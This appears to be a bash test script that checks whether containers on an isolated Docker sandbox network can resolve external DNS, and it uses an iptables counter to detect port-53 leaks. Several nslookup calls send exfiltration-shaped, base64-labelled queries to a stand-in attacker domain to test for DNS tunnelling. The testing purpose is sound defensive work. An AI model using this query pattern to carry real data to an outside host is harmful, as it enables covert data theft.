#!/usr/bin/env bash
# S2: external DNS from a container on the sandbox network must fail or be made to fail.
# Observe: (a) what resolves, (b) whether any DNS packet leaves the host (if tcpdump exists).
source "$(dirname "$0")/lib.sh"

NET="${RUN_ID}-sandbox"
docker network create --internal -o com.docker.network.bridge.gateway_mode_ipv4=isolated "$NET" >/dev/null \
  && defer "docker network rm $NET"

# Not called via $(...): a subshell would discard the defer registration and leak containers.
run_agent() { # run_agent <name> [extra docker run args...]; sets AGENT_CTR
  AGENT_CTR="${RUN_ID}-$1"; shift
  docker run -d --name "$AGENT_CTR" --network "$NET" "$@" "$IMAGE" sleep 120 >/dev/null && defer "docker rm -f $AGENT_CTR"
}
docker run -d --name "${RUN_ID}-gateway" --network "$NET" --network-alias gateway "$IMAGE" sleep 120 >/dev/null \
  && defer "docker rm -f ${RUN_ID}-gateway"

# Wire-level leak measurement without tcpdump: count forwarded port-53 packets with an
# iptables FORWARD rule. Embedded-resolver upstream queries leave the container netns and cross FORWARD, so a
# leak shows up as a counter increase. A control container on a normal network proves the meter works.
dns_pkts() { iptables -nvx -L FORWARD 2>/dev/null | awk '/cwspike-dns-meter/ {s+=$1} END {print s+0}'; }
METER=0
if iptables -I FORWARD -p udp --dport 53 -m comment --comment cwspike-dns-meter 2>/dev/null &&
   iptables -I FORWARD -p tcp --dport 53 -m comment --comment cwspike-dns-meter 2>/dev/null; then
  METER=1
  defer "iptables -D FORWARD -p udp --dport 53 -m comment --comment cwspike-dns-meter"
  defer "iptables -D FORWARD -p tcp --dport 53 -m comment --comment cwspike-dns-meter"
fi
for variant in default dns-none dns-loopback; do
  case "$variant" in
    default)      extra=() ;;
    dns-none)     extra=(--dns 192.0.2.53 --dns-option timeout:1 --dns-option attempts:1) ;; # blackhole resolver
    dns-loopback) extra=(--dns 127.0.0.1 --dns-option timeout:1 --dns-option attempts:1) ;;
  esac
  run_agent "$variant" "${extra[@]}"; c="$AGENT_CTR"
  echo "== variant: $variant"
  docker exec "$c" cat /etc/resolv.conf | grep -E '^(nameserver|options)' | sed 's/^/   /'
  expect_fail "$variant: external name does not resolve (example.com)" docker exec "$c" nslookup -timeout=2 example.com
  # getaddrinfo path (busybox has no getent). ping prints "bad address" only when resolution
  # itself fails, which distinguishes it from "resolved but unreachable".
  ext_out="$(docker exec "$c" ping -c1 -W1 example.com 2>&1)"
  case "$ext_out" in
    *"bad address"*) result PASS "$variant: external name does not resolve via getaddrinfo" ;;
    *) result FAIL "$variant: expected 'bad address' for example.com, got: ${ext_out:0:120}" ;;
  esac
  if [ "$variant" = default ]; then
    if retry 5 docker exec "$c" ping -c1 -W1 gateway; then
      result PASS "$variant: sibling 'gateway' resolves and answers via embedded DNS (getaddrinfo)"
    else
      result FAIL "$variant: sibling 'gateway' did not resolve/answer after 5 tries"
      echo "        | resolv.conf: $(docker exec "$c" cat /etc/resolv.conf | tr '\n' ' ')"
      echo "        | ping: $(docker exec "$c" ping -c1 -W1 gateway 2>&1 | head -3 | tr '\n' ' ')"
      echo "        | nslookup: $(docker exec "$c" nslookup -timeout=2 gateway 2>&1 | head -6 | tr '\n' ' ')"
      echo "        | network: $(docker network inspect "$NET" -f '{{json .Containers}}' | head -c 400)"
      echo "        | docker: $(docker version -f '{{.Server.Version}}')"
    fi
    # Does a TXT/long-label query reach an upstream? Fire exfil-shaped queries.
    docker exec "$c" nslookup -timeout=2 "aGVsbG8tZXhmaWw.$(date +%s).attacker-test.invalid" >/dev/null 2>&1 || true
  fi
done

if [ "$METER" = 1 ]; then
  sleep 1
  BEFORE="$(dns_pkts)"
  for i in 1 2 3; do
    docker exec "${RUN_ID}-default" nslookup -timeout=1 "aGVsbG8tZXhmaWw$i.attacker-test.invalid" >/dev/null 2>&1 || true
    docker exec "${RUN_ID}-default" nslookup -timeout=1 "example.com" >/dev/null 2>&1 || true
  done
  sleep 1
  AFTER="$(dns_pkts)"
  [ "$AFTER" = "$BEFORE" ] && result PASS "no port-53 packets left the host for sandbox-network queries (counter $BEFORE -> $AFTER)" \
                           || result FAIL "port-53 packets left the host from sandbox queries (counter $BEFORE -> $AFTER)"
  # Control: same query from a normal bridge network must move the counter, proving the meter works.
  B2="$(dns_pkts)"
  docker run --rm "$IMAGE" nslookup -timeout=1 example.com >/dev/null 2>&1 || true
  sleep 1
  A2="$(dns_pkts)"
  [ "$A2" != "$B2" ] && result PASS "(control) normal bridge network does emit port-53 packets (counter $B2 -> $A2)" \
                     || result INFO "(control) meter did not move for normal network ($B2 -> $A2); meter may be blind (e.g. egress blocked before OUTPUT)"
else
  result INFO "could not install iptables meter; wire-level DNS check skipped"
fi
summary
